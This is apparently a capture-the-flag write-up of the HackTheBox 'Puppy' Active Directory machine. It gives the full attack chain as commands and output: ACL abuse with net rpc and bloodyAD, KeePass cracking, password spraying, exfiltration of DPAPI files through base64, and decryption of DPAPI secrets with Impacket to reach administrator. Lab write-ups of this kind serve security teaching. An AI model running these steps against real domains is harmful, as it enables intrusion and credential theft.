# HTB: Puppy — Writeup

**OS:** Windows (Active Directory)
**Difficulty:** Medium
**Techniques:** Assumed-breach AD enumeration (BloodHound), GenericWrite group-membership abuse, KDBX4 KeePass cracking, credential harvesting & password spray, GenericAll password reset + `ACCOUNTDISABLE` removal, backup-archive credential leakage (LDAP bind creds), DPAPI masterkey/credential decryption

---

## Synopsis

Puppy is an assumed-breach Active Directory box: the engagement starts with a single set of valid domain credentials (`levi.james`) rather than an unauthenticated foothold. BloodHound reveals `levi.james` sits in the **HR** group, which has `GenericWrite` over the **Developers** group. Adding ourselves to Developers unlocks a `DEV` SMB share containing a KeePass 2 (KDBX4) database, which is cracked offline to recover five more sets of credentials. Spraying those against all domain users lands on `ant.edwards`, who — per BloodHound — has `GenericAll` over `adam.silver`. A password reset (plus clearing the `ACCOUNTDISABLE` flag the reset trips) grants WinRM as `adam.silver`. From there, a website backup archive in `C:\Backups` contains an old LDAP-auth config file with a plaintext bind password for `steph.cooper`, giving WinRM as that user. Finally, DPAPI-protected Credential Manager secrets stored under `steph.cooper`'s profile are decrypted (masterkey + credential blob) to recover `steph.cooper_adm`'s password — a member of Administrators.

## Skills Required

- Assumed-breach Active Directory enumeration with BloodHound.
- Reading ACL edges (`GenericWrite`, `GenericAll`).
- KeePass / KDBX cracking and password spraying.
- DPAPI credential concepts.

## Skills Learned

- `GenericWrite` group-membership abuse to unlock a restricted share.
- Cracking a KDBX4 KeePass database offline.
- `GenericAll` password reset plus clearing the `ACCOUNTDISABLE` flag the reset trips.
- Harvesting plaintext LDAP bind credentials from a website backup archive.
- Decrypting DPAPI-protected Credential Manager secrets (masterkey + credential blob).


---

## Recon

### Nmap

An initial `-p-` scan without `-Pn` reported the host as down (ICMP blocked); adding `-Pn` found the expected AD DC port set:

```bash
nmap -p- --min-rate 10000 10.129.232.75 -Pn
```

```
53/tcp    open  domain
88/tcp    open  kerberos-sec
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2049/tcp  open  nfs
3260/tcp  open  iscsi
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664,49667,49669,49676,49691,56818/tcp  open  msrpc / ncacn_http
```

Follow-up `-sCV` confirmed a Windows Server 2022 domain controller (hostname `DC`) for `PUPPY.HTB`, with SMB signing required and ~7 hours of clock skew against the attack box (relevant later — Kerberos auth fails with `KRB_AP_ERR_SKEW` until time is corrected or NTLM fallback is used).

```bash
nmap -p 53,88,111,135,139,389,445,464,593,636,2049,3260,3268,3269,5985,9389,49664,49667,49669,49676,49691,56818 -sCV 10.129.232.75 -Pn -oA nmap/puppy
```

`/etc/hosts` was updated:

```
10.129.232.75 puppy.htb puppy dc dc.puppy.htb
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-23 02:23:52Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3260/tcp  open  iscsi?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
56818/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-08-23T02:25:44
|_  start_date: N/A
|_clock-skew: 6h59m59s
```

### Credential Validation

The engagement provided assumed-breach credentials: `levi.james : KingofAkron2025!`. Validated with `netexec` across the three protocols that matter for AD lateral movement:

```bash
nxc smb  10.129.232.75 -u levi.james -p 'KingofAkron2025!'
nxc ldap 10.129.232.75 -u levi.james -p 'KingofAkron2025!'
nxc winrm 10.129.232.75 -u levi.james -p 'KingofAkron2025!'
```

SMB and LDAP authenticated; WinRM returned `[-]` — no shell access yet.

Share enumeration (`nxc smb ... --shares`) showed a non-default share:

```
DEV     READ    DEV-SHARE for PUPPY-DEVS
```

— but `levi.james` had no access to browse into it directly.

```
$ nxc smb 10.129.232.75 -u 'levi.james' -p 'KingofAkron2025!'
SMB   10.129.232.75  445  DC  [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB   10.129.232.75  445  DC  [+] PUPPY.HTB\levi.james:KingofAkron2025!

$ nxc smb 10.129.232.75 -u 'levi.james' -p 'KingofAkron2025!' --shares
SMB   10.129.232.75  445  DC  [*] Enumerated shares
SMB   10.129.232.75  445  DC  Share    Permissions  Remark
SMB   10.129.232.75  445  DC  -----    -----------  ------
SMB   10.129.232.75  445  DC  ADMIN$                Remote Admin
SMB   10.129.232.75  445  DC  C$                    Default share
SMB   10.129.232.75  445  DC  DEV                   DEV-SHARE for PUPPY-DEVS
SMB   10.129.232.75  445  DC  IPC$     READ         Remote IPC
SMB   10.129.232.75  445  DC  NETLOGON READ         Logon server share
SMB   10.129.232.75  445  DC  SYSVOL   READ         Logon server share

$ nxc ldap 10.129.232.75 -u 'levi.james' -p 'KingofAkron2025!'
LDAP  10.129.232.75  389  DC  [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB) (signing:None) (channel binding:No TLS cert)
LDAP  10.129.232.75  389  DC  [+] PUPPY.HTB\levi.james:KingofAkron2025!

$ nxc winrm 10.129.232.75 -u 'levi.james' -p 'KingofAkron2025!'
WINRM 10.129.232.75  5985  DC  [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
WINRM 10.129.232.75  5985  DC  [-] PUPPY.HTB\levi.james:KingofAkron2025!
```

---

## AD Enumeration — BloodHound

Collected the graph as `levi.james`:

```bash
bloodhound-ce-python -d puppy.htb -u 'levi.james' -p 'KingofAkron2025!' -ns 10.129.232.75
```

(Kerberos TGT request failed due to clock skew and fell back to NTLM automatically — collection still succeeded: 10 users, 56 groups, 1 computer.)

Ingesting into BloodHound CE showed `levi.james` is a member of **HR**, and **HR has `GenericWrite` over the Developers group** — a direct, first-hop privilege escalation edge from the starting user.

![Screenshot of BloodHound showing LEVI.JAMES@PUPPY.HTB with a MemberOf edge into HR@PUPPY.HTB, which has a GenericWrite edge into DEVELOPERS@PUPPY.HTB](images/bloodhound_generic_write.png)

---

## Foothold — Initial Access via GenericWrite Abuse

`GenericWrite` on a group maps to write access on its `member` attribute — i.e., the ability to add/remove members. Since `levi.james` already authenticates over SMB (which carries SAMR), the classic Samba `net rpc` tooling was used to add `levi.james` to Developers directly:

```bash
net rpc group addmem developers levi.james -U puppy.htb/levi.james%'KingofAkron2025!' -S puppy.htb
```

Verified:

```bash
net rpc group members developers -U puppy.htb/levi.james%'KingofAkron2025!' -S puppy.htb
```

```
PUPPY\levi.james
PUPPY\ant.edwards
PUPPY\adam.silver
PUPPY\jamie.williams
```

With Developers membership in effect, the `DEV` share became browsable:

```bash
smbclient -U puppy.htb/levi.james //puppy.htb/dev --password 'KingofAkron2025!'
```

```
KeePassXC-2.7.9-Win64.msi
Projects/                (empty)
recovery.kdbx
```

`recovery.kdbx` was pulled down for offline attack.

```
smb: \> ls
  .                                  DR        0  Sun Mar 23 07:07:57 2025
  ..                                  D        0  Sat Mar  8 16:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 07:09:12 2025
  Projects                            D        0  Sat Mar  8 16:53:36 2025
  recovery.kdbx                       A     2677  Wed Mar 12 02:25:46 2025

smb: \> get recovery.kdbx
getting file \recovery.kdbx of size 2677 as recovery.kdbx (6.6 KiloBytes/sec) (average 6.6 KiloBytes/sec)
```

---

## Cracking `recovery.kdbx`

### Hash extraction — format gotcha

The distro's stock `keepass2john` refused the file:

```
! recovery.kdbx : File version '40000' is currently not supported!
```

Version `40000` indicates **KDBX4**, which the installed (older) John the Ripper build doesn't understand. A newer/jumbo build was needed.

### Tooling detour

`sudo apt install john-the-ripper` — package not found under that name on this distro. `snap install john-the-ripper` seemed like the obvious fix, but `snap` (Canonical's confined-package tool, `snapd`) wasn't installed — and **`sudo apt install snap` installed the wrong package entirely**: Parrot/Debian ships an unrelated package literally named `snap` (a bioinformatics gene-finder, `SNAP` — "Semi-HMM-based Nucleic Acid Parser"), confirmed via `apt show snap`. The actual daemon needed is the separate `snapd` package (`apt show snapd` confirmed it exists under that name). Installing `snapd` and then `sudo snap install john-the-ripper` finally produced a jumbo-community build that recognizes Argon2/KDBX4 hashes.

### Wordlist access — snap confinement gotcha

Running the jumbo build against the hash initially failed:

```bash
john-the-ripper recovery.kdbx.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
fopen: /usr/share/wordlists/rockyou.txt: No such file or directory
```

— despite the file demonstrably existing. Snap-packaged applications run under strict filesystem confinement and cannot see arbitrary host paths like `/usr/share/...`; they're generally limited to the invoking user's home directory (and a few other whitelisted mount points). Copying the wordlist into the working directory (inside `$HOME`) resolved it immediately:

```bash
cp /usr/share/wordlists/rockyou.txt .
john-the-ripper recovery.kdbx.hash --wordlist=rockyou.txt
```

```
liverpool        (recovery)
```

Master password recovered: **`liverpool`**.

```
$ john-the-ripper recovery.kdbx.hash --wordlist=rockyou.txt
KeePass-opencl: Argon2 hash(es) not supported, skipping.
Warning: detected hash type "KeePass", but the string is also recognized as "KeePass-Argon2-opencl"
Use the "--format=KeePass-Argon2-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [AES/Argon2 256/256 AVX2])
Cost 1 (t (rounds)) is 37 for all loaded hashes
Cost 2 (m) is 65536 for all loaded hashes
Cost 3 (p) is 4 for all loaded hashes
Cost 4 (KDF [0=Argon2d 2=Argon2id 3=AES]) is 0 for all loaded hashes
Will run 6 OpenMP threads
Note: Passwords longer than 41 [worst case UTF-8] to 124 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
liverpool        (recovery)
1g 0:00:00:13 DONE (2026-08-22 20:59) 0.07686g/s 2.767p/s 2.767c/s 2.767C/s friends..liverpool
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Exporting the database

```bash
sudo snap install keepassxc
echo 'liverpool' | keepassxc.cli export --format csv recovery.kdbx
```

```
JAMIE WILLIAMSON   / JamieLove2025!
ADAM SILVER        / HJKL2025!
ANTONY C. EDWARDS  / Antman2025!
STEVE TUCKER       / Steve2025!
SAMUEL BLAKE       / ILY2025!
```

```
$ echo 'liverpool' | keepassxc.cli export --format csv recovery.kdbx
Enter password to unlock recovery.kdbx:
"Group","Title","Username","Password","URL","Notes","TOTP","Icon","Last Modified","Created"
"Root","JAMIE WILLIAMSON","","JamieLove2025!","puppy.htb","","","0","2025-03-10T08:57:58Z","2025-03-10T08:57:01Z"
"Root","ADAM SILVER","","HJKL2025!","puppy.htb","","","0","2025-03-10T09:01:02Z","2025-03-10T08:58:07Z"
"Root","ANTONY C. EDWARDS","","Antman2025!","puppy.htb","","","0","2025-03-10T09:00:02Z","2025-03-10T08:58:46Z"
"Root","STEVE TUCKER","","Steve2025!","puppy.htb","","","0","2025-03-10T09:03:48Z","2025-03-10T09:01:26Z"
"Root","SAMUEL BLAKE","","ILY2025!","puppy.htb","","","0","2025-03-10T09:03:39Z","2025-03-10T09:02:03Z"
```

The password column was pulled out into a flat wordlist for spraying, using `cut` on the `"`-delimited CSV to grab field 8 (`Password`):

```bash
echo 'liverpool' | keepassxc.cli export --format csv recovery.kdbx | cut -d '"' -f8 | tee passwords.txt
```

```
Password
JamieLove2025!
HJKL2025!
Antman2025!
Steve2025!
ILY2025!
```

---

## Credential Spray

Domain users were enumerated via `netexec`'s SAM dump over the authenticated SMB session:

```bash
nxc smb 10.129.232.75 -u levi.james -p 'KingofAkron2025!' --users
```

```
SMB  10.129.232.75  445  DC  [+] PUPPY.HTB\levi.james:KingofAkron2025!
SMB  10.129.232.75  445  DC  -Username-        -Last PW Set-        -BadPW- -Description-
SMB  10.129.232.75  445  DC  Administrator     2025-02-19 19:33:28  0       Built-in account for administering the computer/domain
SMB  10.129.232.75  445  DC  Guest             <never>              0       Built-in account for guest access to the computer/domain
SMB  10.129.232.75  445  DC  krbtgt            2025-02-19 11:46:15  0       Key Distribution Center Service Account
SMB  10.129.232.75  445  DC  levi.james        2025-02-19 12:10:56  0
SMB  10.129.232.75  445  DC  ant.edwards       2025-02-19 12:13:14  0
SMB  10.129.232.75  445  DC  adam.silver       2026-08-23 02:49:29  0
SMB  10.129.232.75  445  DC  jamie.williams    2025-02-19 12:17:26  0
SMB  10.129.232.75  445  DC  steph.cooper      2025-02-19 12:21:00  0
SMB  10.129.232.75  445  DC  steph.cooper_adm  2025-03-08 15:50:40  0
SMB  10.129.232.75  445  DC  [*] Enumerated 9 local users: PUPPY
```

The username column was extracted into a flat list for spraying by filtering out the banner/header lines and grabbing the 5th whitespace-delimited field (the username) from each row:

```bash
nxc smb 10.129.232.75 -u 'levi.james' -p 'KingofAkron2025!' --users \
  | grep -vF -e '[' -e '-Username-' \
  | awk '{print $5}' \
  | tee users.txt
```

```
Administrator
Guest
krbtgt
levi.james
ant.edwards
adam.silver
jamie.williams
steph.cooper
steph.cooper_adm
```

Spraying the five KeePass-recovered passwords (`passwords.txt`, built earlier from the KeePass export) against all nine usernames (`users.txt`):

```bash
nxc smb puppy.htb -u users.txt -p passwords.txt --continue-on-success | grep -F '[+]'
```

```
SMB  10.129.232.75  445  DC  [+] PUPPY.HTB\ant.edwards:Antman2025!
```

WinRM was checked and failed for `ant.edwards`:

```
$ nxc winrm 10.129.232.75 -u 'ant.edwards' -p 'Antman2025!'
WINRM 10.129.232.75  5985  DC  [-] PUPPY.HTB\ant.edwards:Antman2025!
```

— SMB-only access, same pattern as `levi.james`.

---

## Lateral Movement — GenericAll + Disabled Account

BloodHound showed `ant.edwards` has **`GenericAll` over `adam.silver`** (via membership in Senior Devs) — full object control, including the ability to force-set a password without knowing the current one.

![Screenshot of BloodHound showing ANT.EDWARDS@PUPPY.HTB with a MemberOf edge into SENIOR DEVS@PUPPY.HTB, which has a GenericAll edge into ADAM.SILVER@PUPPY.HTB](images/bloodhound_generic_all_adam_silver.png)

```bash
net rpc password adam.silver 'S3cur3P@55' -U puppy.htb/ant.edwards%'Antman2025!' -S puppy.htb
```

The reset succeeded, but authentication then failed with a specific status:

```
$ nxc smb 10.129.232.75 -u 'adam.silver' -p 'S3cur3P@55'
SMB  10.129.232.75  445  DC  [-] PUPPY.HTB\adam.silver:S3cur3P@55 STATUS_ACCOUNT_DISABLED
```

`GenericAll` grants write access to *every* attribute on the object — including `userAccountControl`, where the `ACCOUNTDISABLE` bit lives. `net rpc` isn't built for flipping individual UAC flags, so **bloodyAD** (LDAP-native AD object manipulation) was used instead:

```bash
bloodyAD -u ant.edwards -p 'Antman2025!' --host dc.puppy.htb -d puppy.htb remove uac adam.silver -f ACCOUNTDISABLE
```

```
[+] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl
```

Authentication then succeeded on both SMB and WinRM:

```
$ nxc smb 10.129.232.75 -u 'adam.silver' -p 'S3cur3P@55'
SMB   10.129.232.75  445   DC  [+] PUPPY.HTB\adam.silver:S3cur3P@55

$ nxc winrm 10.129.232.75 -u 'adam.silver' -p 'S3cur3P@55'
WINRM 10.129.232.75  5985  DC  [+] PUPPY.HTB\adam.silver:S3cur3P@55 (Pwn3d!)
```

---

## User

Shell obtained via evil-winrm:

```bash
evil-winrm -i 10.129.232.75 -u adam.silver -p 'S3cur3P@55'
```

```
*Evil-WinRM* PS C:\Users\adam.silver\Desktop> dir

    Directory: C:\Users\adam.silver\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/28/2025  12:31 PM           2312 Microsoft Edge.lnk
-ar---         8/22/2026   6:50 PM             34 user.txt

*Evil-WinRM* PS C:\Users\adam.silver\Desktop> type user.txt
<redacted>
```

---

## Privilege Escalation — Backup Archive → LDAP Bind Creds

Filesystem sweep off the default profile turned up a non-standard top-level directory:

```
*Evil-WinRM* PS C:\Backups> dir

    Directory: C:\Backups

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip
```

Downloaded and extracted locally — a full static-website export (assets, images, `index.html`) plus one configuration file: `nms-auth-config.xml.bak`.

```
$ unzip site-backup-2024-12-30.zip
Archive:  site-backup-2024-12-30.zip
   creating: puppy/
  inflating: puppy/nms-auth-config.xml.bak
   creating: puppy/images/
  inflating: puppy/images/banner.jpg
  ... (assets/, images/, index.html)

$ cat nms-auth-config.xml.bak
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>
```

An LDAP bind credential embedded in an old backed-up app config — validated immediately:

```
$ nxc winrm 10.129.232.75 -u steph.cooper -p 'ChefSteph2025!'
WINRM 10.129.232.75  5985  DC  [+] PUPPY.HTB\steph.cooper:ChefSteph2025! (Pwn3d!)
```

BloodHound showed no outbound object-control edges for `steph.cooper` — a signal that the next step is local to the machine/session rather than another directory-permissions abuse.

---

## Privilege Escalation — DPAPI Credential Theft

Windows Credential Manager entries are encrypted at rest via **DPAPI**, using a per-user "masterkey" that is itself protected by a key derivable from the user's login password + SID. Two files are needed:

```
%APPDATA%\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9        (encrypted credential blob)
%APPDATA%\Roaming\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407  (masterkey file)
```

Locating them:

```
*Evil-WinRM* PS C:\Users\steph.cooper\appdata\roaming\microsoft\credentials> ls -force

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9

*Evil-WinRM* PS ...\microsoft\protect\S-1-5-21-1487982659-1829050783-2281216199-1107> ls -force

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407
-a-hs-         2/23/2025   2:36 PM             24 Preferred
```

`evil-winrm`'s built-in `download` failed on these hidden/system-flagged files:

```
*Evil-WinRM* PS ...\credentials> download C8D69EBE9A43E9DEBF6B5FBD48B521B9
Error: Download failed. Check filenames or paths: uninitialized constant WinRM::FS::FileManager::EstandardError
```

so both were exfiltrated as base64 via PowerShell instead:

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9'))
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\steph.cooper\appdata\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407'))
```

### Reconstruction gotcha

The base64 output was piped back into `base64 -d` locally — but the first attempts silently dropped the pipe character:

```bash
echo '<base64>' base64 -d > 556a2412-1275-4ccf-b721-e6a0b4f90407      # WRONG — no pipe
```

Without `|`, `base64` and `-d` are just extra literal arguments to `echo`, so the file ends up containing the *raw base64 text itself* (plus the stray words `base64 -d`) rather than decoded binary. This surfaced downstream as `dpapi.py` parsing garbage: a nonsensical `Version` field and a garbled `Guid`, followed by:

```
ERROR: ('unpack requires a buffer of 4 bytes', ...)
```

Inspecting the reconstructed file directly (`xxd`) showed literal ASCII base64 characters instead of binary structure — confirming the fix was simply adding the missing pipe:

```bash
echo '<base64>' | base64 -d > 556a2412-1275-4ccf-b721-e6a0b4f90407
echo '<base64>' | base64 -d > C8D69EBE9A43E9DEBF6B5FBD48B521B9
```

### Decryption

With the files rebuilt correctly, the masterkey decrypted cleanly:

```
$ dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
Impacket v0.14.0.dev0+20260819.94127.f133bb88 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

(Compare this to the earlier failed attempt against the corrupted file, which showed a nonsense `Version` of `41416741` and a garbled `Guid` — the tell that the file wasn't real binary yet.)

That decrypted key is then fed to the `credential` subcommand against the credential blob:

```
$ dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
Impacket v0.14.0.dev0+20260819.94127.f133bb88 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description :
Unknown     :
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

Recovered: **`steph.cooper_adm : FivethChipOnItsWay2025!`**

---

## Root

```bash
evil-winrm -i puppy.htb -u steph.cooper_adm -p 'FivethChipOnItsWay2025!'
```

```
*Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ===============================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
...
```

`steph.cooper_adm` is a member of **BUILTIN\Administrators**. `root.txt` retrieved from `C:\Users\administrator\desktop`:

```
*Evil-WinRM* PS C:\Users\administrator\desktop> type root.txt
<redacted>
```

---

## Summary of Techniques

| Stage | Technique |
|---|---|
| Recon | Full TCP port scan (`-Pn` required — ICMP blocked); standard AD DC port fingerprint |
| Enumeration | Assumed-breach credential validation across SMB/LDAP/WinRM with `netexec`; BloodHound CE graph collection |
| Initial access | `GenericWrite` (HR → Developers) abused via `net rpc group addmem` (SAMR) to unlock an SMB share |
| Credential harvesting | KDBX4 KeePass database cracked offline (John jumbo, Argon2 support) after distro-tooling detours; `keepassxc-cli` CSV export |
| Lateral movement | Password spray of harvested creds across all enumerated users (`netexec`) |
| Privilege escalation #1 | `GenericAll` (ant.edwards → adam.silver) abused via `net rpc password`; `ACCOUNTDISABLE` UAC flag cleared via `bloodyAD` (LDAP-native, since SAMR password-reset re-triggers the disabled flag) |
| Privilege escalation #2 | Plaintext LDAP bind credential recovered from an old website backup archive (`nms-auth-config.xml.bak`) |
| Privilege escalation #3 | DPAPI masterkey + Credential Manager blob decryption (`dpapi.py masterkey` / `dpapi.py credential`) to recover a cached admin credential |

---

## Lessons / Takeaways

- **BloodHound edges compound.** This box is a straight-line chain of `GenericWrite`/`GenericAll` edges — always re-run/re-check BloodHound after landing each new identity rather than assuming the graph is exhausted.
- **A password reset via SAMR (`net rpc password`) can silently trip `ACCOUNTDISABLE`** on some AD configurations. If a fresh reset yields `STATUS_ACCOUNT_DISABLED`, the fix is a `userAccountControl` flag write (e.g. via `bloodyAD`), not another password attempt.
- **Package names lie.** `apt install snap` on Debian/Parrot installs an unrelated bioinformatics tool (`SNAP` gene finder), not `snapd`. Always sanity-check what a package actually provides (`apt show <pkg>`) before trusting the name, especially when a tool name collides with a well-known unrelated project.
- **Snap-packaged tools are filesystem-confined** and can't read arbitrary host paths like `/usr/share/wordlists/`. Copy inputs into the invoking user's home directory instead of fighting the sandbox.
- **`echo '<data>' <cmd> > file` without a pipe silently writes garbage.** Without `|`, `base64 -d` (or any second command) is just inert extra arguments to `echo`, and the raw text is written verbatim to the redirect target. Symptoms show up downstream as confusing parser errors (garbled fields, "buffer" unpack errors) rather than an obvious file-transfer failure — worth checking the raw bytes of a reconstructed file (`xxd`/`file`) before assuming the *next* tool in the chain is broken.
- **Old backups are a durable credential leak vector.** A website backup from months prior contained a still-valid LDAP bind password — treat any discovered backup archive as a first-class target for embedded config secrets, not just source code.
- **DPAPI-protected Credential Manager entries are recoverable offline** once you have the user's plaintext password (or an equivalent domain-backup key) plus both the masterkey file and the credential blob — a common last-mile privesc primitive on Windows boxes once local code execution as a domain user is achieved.
